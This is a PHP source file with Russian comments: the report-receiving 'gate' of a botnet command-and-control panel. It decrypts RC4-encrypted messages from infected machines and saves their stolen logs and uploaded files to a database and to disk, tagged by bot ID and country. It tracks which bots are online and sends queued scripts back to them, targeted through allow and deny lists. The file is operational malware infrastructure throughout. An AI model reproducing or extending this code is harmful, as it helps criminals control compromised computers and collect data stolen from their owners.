<?php define('__REPORT__', 1);
/*
  Гейт.
  
  Протокол бот <-> сервер представляет из себя со стороны бота - отсылка отчета о чем либо,
  а со стороны сервера - отправка изменений в настройках( или команды). Со стороны бота, за раз
  отправляется информация об одном событие/объекте.
*/

if(@$_SERVER['REQUEST_METHOD'] !== 'POST')die();
require_once('system/global.php');
require_once('system/config.php');

//Получаем данные.
$data      = @file_get_contents('php://input');
$data_size = @strlen($data);
if($data_size < HEADER_SIZE + ITEM_HEADER_SIZE)die();
$data = RC4($data, BOTNET_CRYPTKEY);

//Верефикация. Если совпадает MD5, нет смысла проверять, что-то еще.
if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)die();

//Парсим данные (Сжатие данных не поддерживается).
//Поздравляю мега хакеров, этот алгоритм позволит вам спокойно читать данные бота. Не забудьте написать 18 парсеров и 100 бэкдоров.
$list = array();
for($i = HEADER_SIZE; $i < $data_size;)
{
  $k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
  $list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
  $i += (ITEM_HEADER_SIZE + $k[3]);
}
unset($data);

//Основные параметры, которые должны быть всегда.
if(empty($list[SBCID_BOT_VERSION]) || empty($list[SBCID_BOT_ID]))die();

//Подключаемся к базе.
if(!ConnectToDB())die();

////////////////////////////////////////////////////////////////////////////////////////////////////
// Обрабатываем данные.
////////////////////////////////////////////////////////////////////////////////////////////////////

$bot_id           = str_replace("\x01", "\x02", trim($list[SBCID_BOT_ID]));
$bot_id_q         = addslashes($bot_id);
$botnet           = (empty($list[SBCID_BOTNET])) ? DEFAULT_BOTNET : str_replace("\x01", "\x02", trim($list[SBCID_BOTNET]));
$botnet_q         = addslashes($botnet);
$bot_version      = ToUint($list[SBCID_BOT_VERSION]);
$real_ipv4        = trim((!empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR']));
$country          = GetCountryIPv4(); //str_replace("\x01", "\x02", GetCountryIPv4());
$country_q        = addslashes($country);
$curtime          = time();
$rtime_min_online = $curtime - BOTNET_TIMEOUT; //Минимальное время, при котором бот считается в онлайне.

//Отчет об исполнении скрипта.
if(!empty($list[SBCID_SCRIPT_ID]) && isset($list[SBCID_SCRIPT_STATUS], $list[SBCID_SCRIPT_RESULT]) && strlen($list[SBCID_SCRIPT_ID]) == 16)
{
  if(!@mysql_query("INSERT INTO botnet_scripts_stat SET bot_id='{$bot_id_q}',bot_version={$bot_version},rtime={$curtime},".
                   "extern_id='".addslashes($list[SBCID_SCRIPT_ID])."',".
                   "type=".(ToInt($list[SBCID_SCRIPT_STATUS]) == 0 ? 2 : 3).",".
                   "report='".addslashes($list[SBCID_SCRIPT_RESULT])."'"))die();
}
//Запись логов/файлов.
else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
{
  $type = ToInt($list[SBCID_BOTLOG_TYPE]);
  
  if($type == BLT_FILE)
  {
    //Расширения которые, представляют возможность удаленного запуска.
    $bad_exts = array('.php', '.asp', '.exe', '.pl', '.cgi', '.cmd', '.bat');
    $fd_hash  = 0;
    $fd_size  = strlen($list[SBCID_BOTLOG]);
    
    //Формируем имя файла.
    $file_path = REPORTS_PATH.'/files/'.urlencode($botnet).'/'.urlencode($bot_id);
    $last_name = '';
    $l = explode('/', (isset($list[SBCID_PATH_DEST]) && strlen($list[SBCID_PATH_DEST]) > 0 ? str_replace('\\', '/', $list[SBCID_PATH_DEST]) : 'unknown'));
    foreach($l as $k)if(strlen($k) > 0 && strcmp($k, '..') !== 0 && strcmp($k, '.') !== 0)$file_path .= '/'.($last_name = urlencode($k));
    if(strlen($last_name) === 0)$file_path .= '/unknown.dat';
    unset($l);
    
    //Проверяем расширении, и указываем маску файла.
    if(($ext = strrchr($last_name, '.')) === false || array_search(strtolower($ext), $bad_exts) !== false)$file_path .= '.dat';
    $ext_pos = strrpos($file_path, '.');
    
    //Добавляем файл.
    for($i = 0; $i < 9999; $i++)
    { 
      if($i == 0)$f = $file_path;
      else $f = substr_replace($file_path, '('.$i.').', $ext_pos, 1);
      
      if(file_exists($f))
      {
        if($fd_size == filesize($f))
        {
          if($fd_hash === 0)$fd_hash = md5($list[SBCID_BOTLOG], true);
          if(strcmp(md5_file($f, true), $fd_hash) === 0)break;
        }
      }
      else
      {
        if(!CreateDir(dirname($file_path)) || !($h = fopen($f, 'wb')))die();
        
        flock($h, LOCK_EX);
        fwrite($h, $list[SBCID_BOTLOG]);
        flock($h, LOCK_UN);
        fclose($h);
        
        break;
      }
    }
  }
  else
  {
    //Запись в базу.
    if(REPORTS_TO_DB === 1)
    {
      $table = 'botnet_reports_'.gmdate('ymd', $curtime);
      $query = "INSERT DELAYED INTO {$table} SET bot_id='{$bot_id_q}',botnet='{$botnet_q}',bot_version={$bot_version},type={$type},country='{$country_q}',rtime={$curtime},".
               "path_source='".  (empty($list[SBCID_PATH_SOURCE])    ? '' : addslashes($list[SBCID_PATH_SOURCE]))."',".
               "path_dest='".    (empty($list[SBCID_PATH_DEST])      ? '' : addslashes($list[SBCID_PATH_DEST]))."',".
               "time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : ToUint($list[SBCID_TIME_SYSTEM])).",".
               "time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : ToUint($list[SBCID_TIME_TICK])).",".
               "time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : ToInt($list[SBCID_TIME_LOCALBIAS])).",".
               "os_version='".   (empty($list[SBCID_OS_INFO])        ? '' : addslashes($list[SBCID_OS_INFO]))."',".
               "language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : ToUshort($list[SBCID_LANGUAGE_ID])).",".
               "process_name='". (empty($list[SBCID_PROCESS_NAME])   ? '' : addslashes($list[SBCID_PROCESS_NAME]))."',".
               "ipv4='".          addslashes($real_ipv4)."',".
               "context='".       addslashes($list[SBCID_BOTLOG])."'";

      //Думаю такой порядок повышает производительность.
      if(!@mysql_query($query) && (!@mysql_query("CREATE TABLE IF NOT EXISTS {$table} LIKE botnet_reports") || !@mysql_query($query)))die();
    }
    
    //Запись в файл.
    if(REPORTS_TO_FS === 1)
    {
      $file_path = REPORTS_PATH.'/other/'.urlencode($botnet).'/'.urlencode($bot_id);
      if(!CreateDir($file_path) || !($h = fopen($file_path.'/reports.txt', 'ab')))die();
      
      flock($h, LOCK_EX);
      fwrite($h, str_repeat("=", 80)."\r\n".
                 "bot_id={$bot_id}\r\n".
                 "botnet={$botnet}\r\n".
                 "bot_version=".IntToVersion($bot_version)."\r\n".
                 "ipv4={$real_ipv4}\r\n".
                 "country={$country}\r\n".
                 "type={$type}\r\n".
                 "rtime=".         gmdate('H:i:s d.m.Y', $curtime)."\r\n".
                 "time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : gmdate('H:i:s d.m.Y', ToInt($list[SBCID_TIME_SYSTEM])))."\r\n".//time() тоже возращает int.
                 "time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : TickCountToTime(ToUint($list[SBCID_TIME_TICK]) / 1000))."\r\n".
                 "time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : TimeBiasToText(ToInt($list[SBCID_TIME_LOCALBIAS])))."\r\n".
                 "os_version=".    (empty($list[SBCID_OS_INFO])        ? '' : OSDataToString($list[SBCID_OS_INFO]))."\r\n".
                 "language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : ToUshort($list[SBCID_LANGUAGE_ID]))."\r\n".
                 "process_name=".  (empty($list[SBCID_PROCESS_NAME])   ? '' : $list[SBCID_PROCESS_NAME])."\r\n".
                 "path_source=".   (empty($list[SBCID_PATH_SOURCE])    ? '' : $list[SBCID_PATH_SOURCE])."\r\n".
                 "context=\r\n".   $list[SBCID_BOTLOG]."\r\n\r\n\r\n");
      flock($h, LOCK_UN);
      fclose($h);
    }
  }
}
//Отчет об онлайн-статусе.
else if(!empty($list[SBCID_BOT_STATUS]))
{
  //Стандартный запрос.
  $query = "bot_id='{$bot_id_q}',botnet='{$botnet_q}',bot_version={$bot_version},country='{$country_q}',rtime_last={$curtime},".

           "net_latency=".   (empty($list[SBCID_NET_LATENCY])    ? 0  : ToUint($list[SBCID_NET_LATENCY])).",".
           "port_s1=".       (empty($list[SBCID_PORT_S1])        ? 0  : ToUshort($list[SBCID_PORT_S1])).",".
           "time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : ToInt($list[SBCID_TIME_LOCALBIAS])).",".
           "os_version='".   (empty($list[SBCID_OS_INFO])        ? '' : addslashes($list[SBCID_OS_INFO]))."',".
           "language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : ToUshort($list[SBCID_LANGUAGE_ID])).",".
           "ipv4='".         addslashes($real_ipv4)."',".
           "flag_nat=IF(net_latency > 0, IF(port_s1 > 0, 0, 1), 1)";//FIXME: Определять NAT ботом.
             
  if(!mysql_query("INSERT INTO botnet_list SET comments='', rtime_first={$curtime}, rtime_online={$curtime}, flag_install=".(ToInt($list[SBCID_BOT_STATUS]) == BS_INSTALLED ? 1 : 0).", {$query} ".
                  "ON DUPLICATE KEY UPDATE rtime_online=IF(rtime_last <= {$rtime_min_online}, {$curtime}, rtime_online), {$query}"))die();

  //Поиск скриптов для отправки.
  $reply_data  = '';
  $reply_count = 0;

  $bot_id_qm  = ToSQLSafeMask($bot_id_q);
  $botnet_qm  = ToSQLSafeMask($botnet_q);
  $country_qm = ToSQLSafeMask($country_q);

  $r = @mysql_query("SELECT extern_id, script_bin, send_limit, id FROM botnet_scripts WHERE flag_enabled=1 AND ".
                    "(countries_wl='' OR countries_wl LIKE BINARY '%\x01{$country_qm}\x01%') AND ".
                    "(countries_bl NOT LIKE BINARY '%\x01{$country_qm}\x01%') AND ".
                    "(botnets_wl='' OR botnets_wl LIKE BINARY '%\x01{$botnet_qm}\x01%') AND ".
                    "(botnets_bl NOT LIKE BINARY '%\x01{$botnet_qm}\x01%') AND ".
                    "(bots_wl='' OR bots_wl LIKE BINARY '%\x01{$bot_id_qm}\x01%') AND ".
                    "(bots_bl NOT LIKE BINARY '%\x01{$bot_id_qm}\x01%') ".
                    "LIMIT 10");

  if($r)while((($m = mysql_fetch_row($r))))
  {
    $eid = addslashes($m[0]);
    
    //Проверяем, не достигнут ли лимит.
    if($m[2] != 0 && ($j = @mysql_query("SELECT COUNT(*) FROM botnet_scripts_stat WHERE type=1 AND extern_id='{$eid}'")) && ($c = mysql_fetch_row($j)) && $c[0] >= $m[2])
    {
      @mysql_query("UPDATE botnet_scripts SET flag_enabled=0 WHERE id={$m[3]} LIMIT 1");
      continue;
    }
    
    //Добовляем бота в список отправленных.
    if(@mysql_query("INSERT HIGH_PRIORITY INTO botnet_scripts_stat SET extern_id='{$eid}', type=1, bot_id='{$bot_id_q}', bot_version={$bot_version}, rtime={$curtime}, report='Sended'"))
    {
      $size = strlen($m[1]) + strlen($m[0]);
      $reply_data .= pack('LLLL', ++$reply_count, 0, $size, $size).$m[0].$m[1];
    }
  }

  if($reply_count > 0)
  {
    $reply_data = pack('LLL', HEADER_SIZE + strlen($reply_data), 0, $reply_count).md5($reply_data, true).$reply_data;
    echo RC4($reply_data, BOTNET_CRYPTKEY);
    die();
  }
}
else die();

//Отправляем пустой ответ.
SendEmptyReply();

///////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////

/*
  Отправка пустого ответа и выход.
*/
function SendEmptyReply()
{
  echo RC4(pack('LLL', HEADER_SIZE + ITEM_HEADER_SIZE, 0, 1)."\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5"."\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", BOTNET_CRYPTKEY);
  die();
}

/*
  Получение страны.
  
  Return - string, страна.
*/
function GetCountryIPv4()
{
  global $real_ipv4;
  $ip = sprintf('%u', ip2long($real_ipv4));
  if(($r = @mysql_query("SELECT c FROM ipv4toc WHERE l<='".$ip."' AND h>='".$ip."' LIMIT 1")) && ($m = mysql_fetch_row($r)) !== false)return $m[0];
  else return '--';
}

/*
  Ковертация Bin2UINT.
  
  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function ToUint($str)
{
  $q = @unpack('L', $str);
  return is_array($q) && is_numeric($q[1]) ? ($q[1] < 0 ? sprintf('%u', $q[1]) : $q[1]) : 0;
}

/*
  Ковертация Bin2INT.

  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function ToInt($str)
{
  $q = @unpack('l', $str);
  return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
}

/*
  Ковертация Bin2SHORT.

  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function ToUshort($str)
{
  $q = @unpack('S', $str);
  return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
}
?>